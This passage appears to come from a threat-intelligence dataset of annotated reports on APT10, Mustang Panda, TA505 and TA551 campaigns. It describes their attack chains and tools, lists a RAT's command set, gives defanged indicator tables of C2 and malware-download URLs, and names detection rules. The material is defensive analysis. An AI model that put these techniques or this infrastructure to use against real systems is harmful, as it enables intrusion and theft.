with the TTP published in other APT10 reports in 2019 ([14]). In this case, it was identified that this campaign began in 2016 and the initial access was carried out with the exploitation of a public web application. Summary of the executed Kill Chain ([14]): • Initial access: The attackers deployed the following China Chopper4, JspSpy5 webshells to obtain a foothold on the victim’s network that they used to execute commands to upload files to the target machines. • Reconnaissance, execution and theft of credentials: In the reconnaissance phase, a series of commands were launched to collect information from users, domains and shared folders. The hostile actor used legitimate tools of the Windows operating systems for the reconnaissance stage, such as “ipconfig.exe”, “whoami.exe”, “net.exe”, “ping.exe”, “powershell.exe” and ” BloodHound ”(bloodHound is not a legitimate binary from Microsoft). The attacker used an advanced tool called “dns.exe” to list all the machines that were registered in a particular domain. Regarding the execution, the hostile actor implemented “hTran” backdoor to be able to exfiltrate information. In previous malicious APT10 campaigns against Turkey, this executable file was seen with the name “java.exe” on compromised hosts. Hostile actors loaded a malicious DLL into the memory of a legitimate binary. The final payload is injected into the legitimate process “svchost.exe”. It was identified that this payload was a PlugX variant or a CobaltStrike Beacon as a post-exploitation framework. To carry out the theft of credentials the hostile actor used the following tools: “QuarksPWdump” and “Mimikatz”. • Lateral movements Through the lateral movements they were able to compromise critical servers and gain access as a domain administrator. The group used NTLM hashes to move laterally. They used the tools “net.exe”, “wmic.exe”, “psexec.exe”, “smbexec”, and “wmiexec”. • Persistence The advanced group established persistence in certain servers that were of their interest and deployed a remote access Trojans such as “QuasarRAT” and “PlugX”, moreover penetration or “pentesting” tools such as “Cobalt Strike” and “kerberos”. • C&C connections Hostile actors used two different ways to keep connections with C&C servers. Once the vulnerability was exploited to establish itself on the public server, the group moved to the “terminal server”. To establish communications with the other hosts in the internal network, they installed an SMB beacon on the “terminal server”, using it as a bridge between the internal network and the C&C server. ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-4.png) *Illustration 4.First C&C communication method* However, the group established a different method for hosts that had direct access or had a proxy. In this case they used the http protocol to establish the communications with the C&C. ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-5.png) *Illustration 5.Second C&C communication method* In the following chart, there are the TTPs developed by APT10 during this malicious campaign against the Turkish organizations ([16]) ([14]): ![](https://lab52.io/blog/wp-content/uploads/2020/05/IL-6.png) *Illustration 6.TTP used in the APT10 campaign* Recommendations: It is recommendable that the organizations from the defense sector, governments, energy, telecommunications and finance linked to projects that may affect the interests of China apply the maximum prevention to this increase of malicious campaigns from APT groups presumably linked to China. It is recommended to apply the IOC of the APT identified as a threat by their intelligence provider LAB52 as soon as possible. It is recommended to keep the operating systems, services and tools used in the organization updated with the latest security patches. It is recommended to establish security policies (GPOs) to control accesses and actions carried out in those systems and / or services that are exposed to the internet. Conclusions: Since the last decade, Turkey has acquired an important influence in the energy geopolitics of the Eastern Mediterranean Sea. The Turkish foreign policies has hindered the China’s international trade strategies. Furthermore, the diplomatic Turkish support to certain Chinese ethnic groups that are considerate as a threat against the Chinese national security, could provoke that Turkey becomes a target of groups like APT10 which presumably are linked to the Ministry of State Security of China. APT10 is a group that has a wide range of targets. The organizations from sectors of interest for the government of China and the organizations that have some kind of link with the commercial development of the OBOR route could be susceptible to being targeted by groups such as APT10. References: [1] <https://www.mei.edu/publications/turkeys-eastern-mediterranean-quagmire> [2] <https://www.petroleum-economist.com/> [3] <https://greece.greekreporter.com/2018/10/12/greece-egypt-aim-to-strangulate-turkey-in-east-med-turkish-daily-claims/> [4] <https://moderndiplomacy.eu/2019/12/20/the-exclusive-economic-zone-between-libya-and-turkey/> [5] <https://www.ozelburoistihbarat.com/kitalar-bolgeler-akdeniz-karadeniz-ege-marmara/dogu-akdenizde-tartisma-harita-uydu-goruntuleri-eren-talha-altun-12708> [6] Kontakos P. (2018) Blue economy enterpreneurship in Offshore Energy in Cyprus and Greece. Journal of International Scientific Publications [7] <https://www.welt.de/wirtschaft/article204725766/EastMed-Das-ist-Europas-neue-Problem-Pipeline.html> [8] <https://www.turkishminute.com/2020/02/19/turkey-buys-third-drilling-ship-for-mediterranean-gas-exploration-erdogan/> [9]<https://www.cidob.org/en/publications/publication_series/notes_internacionals/n1_156/china_moors_in_the_mediterranean_a_sea_of_opportunities_for_europe> [10] <https://www.aljazeera.com/news/2019/11/greece-china-hail-strategic-partnership-eu-191111170150762.html> [11] <http://www.ekathimerini.com/247559/article/ekathimerini/news/chinese-led-consortium-to-build-cyprus-gas-import-terminal> [12] <https://www.icij.org/investigations/china-cables/china-cables-who-are-the-uighurs-and-why-mass-detention/> [13] <https://www.voanews.com/extremism-watch/uighurs-concerned-china-luring-turkey-silence-xinjiang> [14] Adeo IT Consulting Services. January 2020. APT10 Threat Analysis Report. <https://adeo.com.tr/en/adeo_annual_threat_report/> [15] <https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion> [16] <https://attack.mitre.org/> [17] <https://www.un.org/depts/los/convention_agreements/texts/unclos/part5.htm>"
annoctr,annoctr/AnnoCTR/text/dev/lab52_2020-06-02_mustang-panda-recent-activity-dll.txt,lab52_2020-06-02_mustang-panda-recent-activity-dll,G0006,"Mustang Panda Recent Activity: Dll-Sideloading trojans with temporal C2 servers June 02, 2020 Recently, from Lab52 we have detected a recent malware sample, using the Dll-Sideload technique with a legitimate binary, to load a threat. This particular sample has a very small DLL, that loads an encrypted file, which after being decrypted consists of a sample of the PlugX Trojan. This technique, and final threat together, consists of one of the most common TTPs among some APT groups generally of Chinese origin such as APT1, APT27 and Mustang Panda. The sample in question is downloaded from the following link “http://miandfish.]store/player/install\_flash\_player.exe” and although in previous months, it had another hash, currently the sample hosted under that name has the following hash “c56ac01b3af452fedc0447d9e0fe184d093d3fd3c6631aa8182c752463de570c”. The binary consists of an installer, which drops in the folder “C:\ProgramData\AAM Updatesnnk” the legitimate binary vulnerable to dll sideload, the small dll that acts as a loader for the final threat, and the binary file, which consists of the encrypted PlugX sample. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-05-20-2.png) After deploying the three files, the installer runs the legitimate binary, causing the final PlugX threat to be loaded by it. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-07-14-3.png) In this case, the legitimate vulnerable binary is part of Adobe’s Swite which will load any library named “hex.dll” that is next to the executable. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-21-53-2.png) That hex.dll, in this case is a very simple and relatively small loader: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-11-06-2.png) It has 4 exports that return 0 without doing anything, the Main function of the library, on the other hand, calls a function that checks the existence of the .dat file which is hardcoded (adobeupdate.dat in this case), loads it, extracts the first string of the binary and uses it as XOR key to decode the rest of the file, which consists on the final threat. The [following code](https://raw.githubusercontent.com/Bondey/PlugxScripts/master/PlugDecoder.py) in python imitates the logic of decoding: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-27-10-2.png) When it finishes deciphering it, it loads the malware into memory, makes a “Memprotect” to make it executable and launches its logic from the byte 0 of the binary. It is a functional PE, so this should not work, since it starts with the “MZ” header of a normal binary: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-29-56-2.png) But in this case it uses a technique already seen before in tools like the Cobalt Strike Beacon that by modifying some bytes of the MZ header, it becomes meaningful executable code. If we open the binary as a shellcode (de-compiling from byte 0) we see how they have modified the first bytes into a routine that jumps to a code zone, consisting of a PE loader: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-32-07-2.png) After loading the IAT and leaving everything ready as a normal executable, this threat decrypts its own config, which is encrypted in XOR in the .data section of the binary. This time the decryption key is hardcoded in the binary, and is the string “123456789”. After decrypting its configuration, it contains the folder where the binary must be installed, a XOR key that will use to encrypt it’s traffic and a list of up to 4 domains or IP addresses of command and control servers together with the port to be used. Generally the 4 C2 elements consists of the same domain repeated 4 times or 2 domains repeated twice each. After the analysis, both the loader in DLL format and the final encrypted threat (after decryption) have been compared with different campaign samples of groups known to use this dll sideload technique, and it has been possible to verify how both the loader and the final threat coincide in a high percentage with the samples of the “Mustang Panda” group analyzed in the following reports [[1]](https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication) [[2]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc.html) [[3]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc-phan2.html). In fact, the loader of this campaign is able to load and run the samples of the campaigns analyzed in those reports, and the final threat uses exactly the same XOR key to decipher its configuration as the samples in those reports, so there is a high probability that it is a new campaign from this same group. This particular sample has the domains “www.destroy2013.]com” and “www.fitehook.]com” as c2 servers, and we have seen that they have a very characteristic behavior, since most of the day they resolve to 127.0.0.1, but from 1-3 AM (UTC) to 8-9 AM (UTC) it resolves to the IP “107.150.112.]250, except for weekends that it resolves constantly to 127.0.0.1, which could indicate that it is a campaign that is focused on a time zone in which those hours are working hours. | IP | 81.16.28.]30 | | IP | 107.150.112.]250 | | DOMAIN | www.destroy2013.]com | | DOMAIN | www.fitehook.]com | | DOMAIN | miandfish.]store | | SHA256 | c56ac01b3af452fedc0447d9e0fe184d093d3fd3c6631aa8182c752463de570c | | SHA256 | 9c0f6f54e5ab9a86955f1a4beffd6f57c553e34b548a9d93f4207e6a7a6c8135 |"
annoctr,annoctr/AnnoCTR/text/dev/lab52_2020-06-02_mustang-panda-recent-activity-dll.txt,lab52_2020-06-02_mustang-panda-recent-activity-dll,G0129,"Mustang Panda Recent Activity: Dll-Sideloading trojans with temporal C2 servers June 02, 2020 Recently, from Lab52 we have detected a recent malware sample, using the Dll-Sideload technique with a legitimate binary, to load a threat. This particular sample has a very small DLL, that loads an encrypted file, which after being decrypted consists of a sample of the PlugX Trojan. This technique, and final threat together, consists of one of the most common TTPs among some APT groups generally of Chinese origin such as APT1, APT27 and Mustang Panda. The sample in question is downloaded from the following link “http://miandfish.]store/player/install\_flash\_player.exe” and although in previous months, it had another hash, currently the sample hosted under that name has the following hash “c56ac01b3af452fedc0447d9e0fe184d093d3fd3c6631aa8182c752463de570c”. The binary consists of an installer, which drops in the folder “C:\ProgramData\AAM Updatesnnk” the legitimate binary vulnerable to dll sideload, the small dll that acts as a loader for the final threat, and the binary file, which consists of the encrypted PlugX sample. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-05-20-2.png) After deploying the three files, the installer runs the legitimate binary, causing the final PlugX threat to be loaded by it. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-07-14-3.png) In this case, the legitimate vulnerable binary is part of Adobe’s Swite which will load any library named “hex.dll” that is next to the executable. ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-21-53-2.png) That hex.dll, in this case is a very simple and relatively small loader: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-11-06-2.png) It has 4 exports that return 0 without doing anything, the Main function of the library, on the other hand, calls a function that checks the existence of the .dat file which is hardcoded (adobeupdate.dat in this case), loads it, extracts the first string of the binary and uses it as XOR key to decode the rest of the file, which consists on the final threat. The [following code](https://raw.githubusercontent.com/Bondey/PlugxScripts/master/PlugDecoder.py) in python imitates the logic of decoding: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-27-10-2.png) When it finishes deciphering it, it loads the malware into memory, makes a “Memprotect” to make it executable and launches its logic from the byte 0 of the binary. It is a functional PE, so this should not work, since it starts with the “MZ” header of a normal binary: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-29-56-2.png) But in this case it uses a technique already seen before in tools like the Cobalt Strike Beacon that by modifying some bytes of the MZ header, it becomes meaningful executable code. If we open the binary as a shellcode (de-compiling from byte 0) we see how they have modified the first bytes into a routine that jumps to a code zone, consisting of a PE loader: ![](https://lab52.io/blog/wp-content/uploads/2019/08/Captura-de-pantalla-de-2020-05-19-17-32-07-2.png) After loading the IAT and leaving everything ready as a normal executable, this threat decrypts its own config, which is encrypted in XOR in the .data section of the binary. This time the decryption key is hardcoded in the binary, and is the string “123456789”. After decrypting its configuration, it contains the folder where the binary must be installed, a XOR key that will use to encrypt it’s traffic and a list of up to 4 domains or IP addresses of command and control servers together with the port to be used. Generally the 4 C2 elements consists of the same domain repeated 4 times or 2 domains repeated twice each. After the analysis, both the loader in DLL format and the final encrypted threat (after decryption) have been compared with different campaign samples of groups known to use this dll sideload technique, and it has been possible to verify how both the loader and the final threat coincide in a high percentage with the samples of the “Mustang Panda” group analyzed in the following reports [[1]](https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication) [[2]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc.html) [[3]](https://blog.vincss.net/2020/03/re012-phan-tich-ma-doc-loi-dung-dich-COVID-19-de-phat-tan-gia-mao-chi-thi-cua-thu-tuong-Nguyen-Xuan-Phuc-phan2.html). In fact, the loader of this campaign is able to load and run the samples of the campaigns analyzed in those reports, and the final threat uses exactly the same XOR key to decipher its configuration as the samples in those reports, so there is a high probability that it is a new campaign from this same group. This particular sample has the domains “www.destroy2013.]com” and “www.fitehook.]com” as c2 servers, and we have seen that they have a very characteristic behavior, since most of the day they resolve to 127.0.0.1, but from 1-3 AM (UTC) to 8-9 AM (UTC) it resolves to the IP “107.150.112.]250, except for weekends that it resolves constantly to 127.0.0.1, which could indicate that it is a campaign that is focused on a time zone in which those hours are working hours. | IP | 81.16.28.]30 | | IP | 107.150.112.]250 | | DOMAIN | www.destroy2013.]com | | DOMAIN | www.fitehook.]com | | DOMAIN | miandfish.]store | | SHA256 | c56ac01b3af452fedc0447d9e0fe184d093d3fd3c6631aa8182c752463de570c | | SHA256 | 9c0f6f54e5ab9a86955f1a4beffd6f57c553e34b548a9d93f4207e6a7a6c8135 |"
annoctr,annoctr/AnnoCTR/text/dev/proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity.txt,proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity,G0092,"Whatta TA: TA505 Ramps Up Activity, Delivers New FlawedGrace Variant October 19, 2021 ### **Key Takeaways** * The prominent TA505 has returned to distributing large volumes of malicious emails affecting most industries. * New tools include a KiXtart Loader, the MirrorBlast loader, an updated FlawedGrace variant, and updated malicious Excel attachments. * One of the region-specific campaigns targeted German-speaking countries, notably Germany and Austria. * The campaigns share many similarities with TA505 campaigns from 2019 and 2020. ### **Overview** Since early September 2021, Proofpoint researchers are tracking renewed malware campaigns by the financially driven [TA505](/us/threat-insight/post/threat-actor-profile-ta505-dridex-globeimposter ""Threat Actor Profile: TA505, From Dridex to GlobeImposter""). The campaigns, which are distributed across a wide range of industries, started with low volume email waves that ramped up in late September, resulting in tens to hundreds of thousands of emails. Many of the campaigns, especially the large volume ones, strongly resemble the historic TA505 activity from 2019 and 2020. The commonalities include similar domain naming conventions, email lures, Excel file lures, and the delivery of the FlawedGrace remote access trojan (RAT). The campaigns also contain some noteworthy, new developments, such as retooled intermediate loader stages scripted in Rebol and KiXtart, which are used instead of the previously popular Get2 downloader. The new downloaders perform similar functionality of reconnaissance and pulling in the next stages. Lastly, there is an updated version of FlawedGrace. ### **Evolving Campaigns** The initial campaigns observed by Proofpoint in September 2021 were comparatively small in volume, several thousand emails per wave, and delivered malicious Excel attachments. In late September and in early October 2021 this changed, and TA505 began sending higher email volumes, tens to hundreds of thousands, to more industries. Additionally, the actor began leveraging both URL and attachment-based email campaigns and diversified from targeting predominantly North America to also targeting German-speaking countries, including Germany and Austria. ### **September 2021 Campaigns** The early campaigns identified by Proofpoint in September 2021 were low volume compared to typical TA505 activity, with only several thousand messages per wave. TA505 used more specific lures that did not affect as many industries as the more recent October 2021 campaigns. Example lures included legal, media release, situation report, and health claim themes. These early campaigns also largely focused on targets in North America, such as United States and Canada. The emails contained an Excel attachment that, when opened and macros enabled, would lead to the download and running of an MSI file. The MSI file in turn would execute an embedded Rebol loader, dubbed by Proofpoint as MirrorBlast. ![image-20211015150648-1](/sites/default/files/inline-images/image-20211015150648-1.jpeg) *Figure 1. Email purporting to be from an insurance claims analyst, part of the September 28, 2021 campaign.* ![image-20211015150648-2](/sites/default/files/inline-images/image-20211015150648-2.png) *Figure 2. The insurance claim Excel attachment, part of the September 28, 2021 campaign.* ### **October 2021 Campaigns** In late September and throughout October 2021, Proofpoint observed a shift to familiar TA505 tactics, techniques, and procedures (TTPs) that are reminiscent of the actor’s 2019 and 2020 campaigns. An additional intermediary loader scripted in KiXtart was introduced, and the attack chain evolved to the following: * An email containing one of the below: + Excel attachment + HTML attachment that links to the download of an Excel file + URL linking to a landing page that redirects to the download of an Excel file + URL directly linking to an Excel file * The Excel file macros download and run an MSI file * The MSI file executes an embedded KiXtart loader * The KiXtart loader receives a command from the C&C server to download another MSI file that executes MirrorBlast * MirrorBlast then downloads additional Rebol script stagers * The follow-on Rebol stagers drop ReflectiveGnome * ReflectiveGnome in turn downloads more shellcode, that will then drop and detonate FlawedGrace The email lures moved away from the detailed lures seen initially in this spate of campaigns. They became more generic, with subjects such as “SECUREFILE,” “SECURE DOCUMENT,” and “You’ve been sent a secure message. Additionally, the themes and abused brands included COVID-19, DocuSign, insurance, invoices, and Microsoft. ![image-20211015150648-3](/sites/default/files/inline-images/image-20211015150648-3.jpeg) *Figure 3.* *October 13, 2021* *German-language email* *using a OneDrive shared file lure.* ![image-20211015150648-4](/sites/default/files/inline-images/image-20211015150648-4.png) *Figure 4. October 13, 2021 landing page abusing Microsoft and OneDrive branding.* ![image-20211015150648-5](/sites/default/files/inline-images/image-20211015150648-5.png) *Figure 5. Excel file used in the October 13, 2021 campaign with a simple green lure.* ### **Similarities to Historic TA505 Activity** There is much similarity between the new and historic TA505 campaigns, starting with the **emails**. ![image-20211015150648-6](/sites/default/files/inline-images/image-20211015150648-6.png) *Figure 6. The OneDrive shared file email lure used in August 21, 2020 (left) strongly resembles a similar email from October 7, 2021 (right). Note the additional use of a COVID-19 theme in the recent campaign.* The **landing pages** in historic and current TA505 campaigns contain “IP Logger” links that likely enable TA505 to track the IP addresses of the machines downloading the malicious files. Additionally, TA505 is still mimicking file hosting services in the landing pages. ![image-20211015150648-7](/sites/default/files/inline-images/image-20211015150648-7.png) *Figure 7. The landing page used in a November 21, 2019 campaign is shown on the left, while the landing page used in the October 7, 2021 campaign is shown on the right.* While the Excel macros VBA code in the recent TA505 campaigns is different, some of the **Excel graphic lures** are similar or identical to those previously used by TA505. ![image-20211015150648-8](/sites/default/files/inline-images/image-20211015150648-8.png) *Figure 8. The Excel sheet lure spoofing Microsoft logos remained identical from September 2, 2020 (Left) to October 6, 2021 (Right).* **Domain naming conventions:** It is also notable that TA505 has historically used domains that mimic various file hosting service providers and structured them in formats with hyphen separated terms. The domains used in late September 2021 and onward follow this structure. **Code reuse**: Proofpoint researchers found code reuse in parts of the delivery chain such as in multiple parts of the landing page (see [an example mentioned here](https://twitter.com/stoerchl/status/1448561662181658628)). ### **Excel Macros Analysis** For TA505’s 2021 campaigns to be successful, potential victims must enable macros after opening the malicious Excel files. The code responsible for downloading the next stage MSI file was typically lightly obfuscated with filler characters, string reversing or similar simple functions and hidden in the document Comments, Title, in a Cell or other locations. ![image-20211015150648-9](/sites/default/files/inline-images/image-20211015150648-9.png) *Figure 9. Example Excel macros code.* ![image-20211015150648-10](/sites/default/files/inline-images/image-20211015150648-10.png) *Figure 10. The parameters Subject and Comments are stored in the workbook properties.* ![image-20211015150648-11](/sites/default/files/inline-images/image-20211015150648-11.png) *Figure 11. Deobfuscated downloader JScript. This pulls the next stage—an MSI file.* ### **Intermediate Loaders** TA505 now uses multiple intermediate loaders before the delivery of the FlawedGrace RAT. The new loader stages are coded in uncommon scripting languages—Rebol and KiXtart. They appear to serve the same purpose as [Get2](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader) — a downloader that has been in use by TA505 since 2019 to deliver a variety of secondary payloads. The loaders perform minimal reconnaissance of an infected machine, such as collecting user domain and username information, and download further payloads. ![downloads](/sites/default/files/inline-images/MicrosoftTeams-image%20%2818%29_1.png) *Figure 12. Attack paths ultimately leading to FlawedGrace.* In the attack chain, the Excel macros download the first MSI file, which executes the first loader, encoded in KiXtart scripting language. The KiXtart interpreter then receives a command from the C&C server to download a follow-on MSI package. Of note, KiXtart loader is not always part of the attack chain. The second MSI package contains multiple files that may have different names, for example, AudioDriver.exe (the Rebol interpreter), AudioDriver.exe.lnk (command that informs .ico execution), and image.ico (the Rebol script). This Rebol script is the second new downloader in the chain, that Proofpoint dubbed MirrorBlast. ![image-20211015150649-13](/sites/default/files/inline-images/image-20211015150649-13.png) *Figure 13. Example of MirrorBlast script, it may be slightly different in different campaigns.* MirrorBlast in turn downloads additional Rebol script stagers that execute simple downloaders, dubbed by Proofpoint as ReflectiveGnome. ReflectiveGnome in turn downloads more shellcode, that will then drop and detonate FlawedGrace. ![image-20211015150649-14](/sites/default/files/inline-images/image-20211015150649-14.png) *Figure 14. Rebol script downloaded by MirrorBlast that drops ReflectiveGnome loader (dwm-x64.exe / dwm-x32.exe).* ![image-20211015150649-15](/sites/default/files/inline-images/image-20211015150649-15.png) *Figure 15. ReflectiveGnome loader which executes the next stage as a shellcode.* ![image-20211015150649-16](/sites/default/files/inline-images/image-20211015150649-16.png) *Figure 16. This shellcode drops and detonates an updated FlawedGrace.* ### **Updated FlawedGrace RAT** Proofpoint researchers first observed [FlawedGrace](/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505 ""ServHelper and FlawedGrace - New malware introduced by TA505"") in November 2017. It is a full-featured RAT written in C++ that can receive the following commands from its C&C via a custom binary protocol on TCP port 443: * target\_remove * target\_update * target\_reboot * target\_module\_load * target\_module\_load\_external * target\_module\_unload * target\_download * target\_upload * target\_rdp * target\_passwords * target\_servers * target\_script * destroy\_os * desktop\_stat While Proofpoint researchers are still investigating the updates to this version of FlawedGrace, some notable changes include: * Encrypted strings * Obfuscated API calls * Configuration is now stored as an encrypted resource (initial/default config), then it is stored both in a mapped memory region (current configuration instance) and in the registry (persistence) ### **Attribution** Proofpoint attributes the campaigns discussed in this blog to TA505 with high confidence. Proofpoint's assessment that TA505 is responsible for this renewed activity is based on the aforementioned similarities between historic TA505 campaigns and this new activity, including, but not limited to, code similarities, domain naming patterns and the use of FlawedGrace, which has been almost exclusively linked to TA505 activity. ### **Outlook** TA505 is an established threat actor that is financially motivated and known for conducting malicious email campaigns on a previously unprecedented scale. The group regularly changes their TTPs and are considered [trendsetters](/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505 ""ServHelper and FlawedGrace - New malware introduced by TA505"") in the world of cybercrime. This threat actor does not limit its target set, and is, in fact, an equal opportunist with the geographies and verticals it chooses to attack. This combined with TA505’s ability to be flexible, focusing on what is the most lucrative and shifting its TTPs as necessary, make the actor a continued threat. Proofpoint researchers expect TA505 to continue to adjust its operations and methods always with an eye to financial gain. Using intermediate loaders in its attack chain is also likely to become a longer-term technique employed by the threat actor. #### **EmergingThreats Detection Rules** 2034012 - ET TROJAN MirrorBlast Checkin (trojan.rules) 2034022 - ET TROJAN MirrorBlast CnC Activity M2 (trojan.rules) 2034023 - ET TROJAN MirrorBlast CnC Activity M3 (trojan.rules) 2034091 - ET TROJAN MirrorBlast KiXtart Downloader Client Request (trojan.rules) 2034110 - ET TROJAN MirrorBlast KiXtart Downloader Server Response (trojan.rules) 2034136 - ET TROJAN MirrorBlast KiXtart Downloader Client Request M2 (trojan.rules) 2034042 - ET TROJAN ReflectiveGnome Download Activity (trojan.rules) #### **EmergingThreats PRO Detection Rules** 2850099 - ETPRO TROJAN FlawedGrace CnC Activity M2 (trojan.rules) 2850098 - ETPRO TROJAN FlawedGrace CnC Activity M1 (trojan.rules) #### **Indicators of Compromise** | **IOC** | **IOC Type** | **Description** | | hxxp://139.59.93.223/c[.]php | URL | MirrorBlast C&C | | hxxp://menorukis[.]su | URL | MirrorBlast C&C | | hxxp://fidufagios[.]com/ | URL | MirrorBlast C&C | | hxxp://feristoaul[.]com/ | URL | MirrorBlast C&C | | hxxp://172.105.178.119/install[.]msi | URL | MSI Download | | hxxp://207.246.101.153/chrome[.]msi | URL | MSI Download | | hxxp://207.246.101.153/setup[.]msi | URL | MSI Download | | cdn-wfs-nspod[.]com | Domain | FlawedGrace C&C | | hxxps://cdn03664-dl-fileshare[.]com/files/xls/Employee%20Update%20-%20Covid[.]xls | URL | Initial Download | | hxxps://cdn-8846-sharepoint-office[.]com/CL09302021\_00137[.]xls | URL | Initial Download | | hxxps://cdn-8846-sharepoint-office[.]com/COVID19\_list[.]xls | URL | Initial Download | | hxxps://cdn-8846-sharepoint-office[.]com/FP01102021\_001[.]xls | URL | Initial Download | | hxxps://dzikic-my-sharepoint[.]com/file/Manulife\_policy[.]xls | URL | Initial Download | | hxxps://dzikics-my-sharepoint[.]com/file/Employee\_Authorization\_Form[.]xls | URL | Initial Download | | hxxp://141.164.41[.]231/host64\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://141.164.41[.]231/host32\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://89.44.197[.]46/host64\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://89.44.197[.]46/host32\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://193.42.36[.]110/host64\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://193.42.36[.]110/host32\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://5.149.255[.]14/host64\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://5.149.255[.]14/host32\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) | | hxxp://155.138.205[.]35/?pool | URL | First Stage Kixtart Script Payload | | hxxp://45.79.239[.]23/version.php?data= | URL | First Stage Kixtart Script C&C | | hxxp://185.202.93[.]201:80/mlp[.]php | URL | First Stage Kixtart Script C&C | | hxxp://185.183.96[.]147/?data= | URL | First Stage Kixtart Script C&C | | hxxp://185.176.220[.]198/?data= | URL | First Stage Kixtart Script C&C | | hxxp://155.138.205[.]35/ | URL | Excel MSI Payload | | hxxp://95.216.138[.]82/ | URL | Excel MSI Payload | | hxxp://194.180.174[.]6/ | URL | Excel MSI Payload | | hxxp://185.10.68[.]235/ | URL | Excel MSI Payload | | hxxp://185.225.19[.]246/ | URL | Excel MSI Payload | | hxxp://185.225.19[.]156/ | URL | Kixtart Payload (MirrorBlast) | | hxxp://192.36.27[.]92/10opd3r\_load[.]msi | URL | Kixtart Payload (MirrorBlast) | | hxxp://5.188.108[.]40/trehjugdr4et6u[.]msi | URL | Kixtart Payload (MirrorBlast) |"
annoctr,annoctr/AnnoCTR/text/dev/proofpoint_2021-10-20_ta551-uses-sliver-red-team.txt,proofpoint_2021-10-20_ta551-uses-sliver-red-team,G0127,"Security Brief: TA551 Uses ‘SLIVER’ Red Team Tool in New Activity October 20, 2021 Proofpoint researchers identified a new campaign from the highly active cybercrime actor known as TA551 using a legitimate “Red Team & adversary simulation Framework”. The new activity demonstrates a significant departure from the previously observed activity from this group. Proofpoint assesses with high confidence the new activity could lead to ransomware infections. TA551 is a criminal threat actor Proofpoint has tracked since 2016. It is known by other security firms as [Shathak](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/). Proofpoint assesses with high confidence TA551 gains access to stolen messages or compromised email accounts – also known as thread hijacking – which it uses in email campaigns to distribute malware. TA551 has previously distributed malware payloads such as Ursnif, IcedID, Qbot, and Emotet. This actor acts as an [initial access facilitator](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware) for ransomware threat actors. Proofpoint has observed its campaigns leveraging banking trojans have led to ransomware infections. Proofpoint assesses with high confidence TA551 IcedID implants were associated with Maze and Egregor ransomware [events](https://www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html) in 2020. On 20 October 2021, Proofpoint observed emails that appeared to be replies to previous conversations and contained password-protected zipped Word documents. The attachments ultimately lead to the download of [Sliver](https://github.com/BishopFox/sliver/tree/6c02971b54831884d30407b632a379947dd289ad), an open-source, cross-platform adversary simulation and red team platform. The activity demonstrated a significant departure from previous tactics, techniques, and procedures from TA551. ![Figure: Thread hijacked email containing zipped Word document.](/system/files/inline-images/BlogImg1_Silver.png) *Figure: Thread hijacked email containing zipped Word document.* When a victim downloads the zipped attachment, they are ultimately directed to a macro-laden Microsoft Word document. If macros are enabled, SLIVER is downloaded. ![Figure: Malicious Microsoft Word document directing victims to enable macros.](/sites/default/files/inline-images/BlogImg2_Silver.png) *Figure: Malicious Microsoft Word document directing victims to enable macros.* SLIVER is available for free online, and capabilities include information gathering, command and control (C2) functionality, token manipulation, process injection, and other features. Red teaming tools are becoming increasingly popular with cybercrime threat actors. For instance, Proofpoint observed a [161% increase](https://www.proofpoint.com/us/blog/threat-insight/cobalt-strike-favorite-tool-apt-crimeware) in threat actor use of the red teaming tool Cobalt Strike between 2019 and 2020. Additional offensive frameworks that appear as first stage payloads used by cybercrime actors include Lemon Tree and Veil. TA551’s use of SLIVER demonstrates considerable actor flexibility. As an established initial access broker 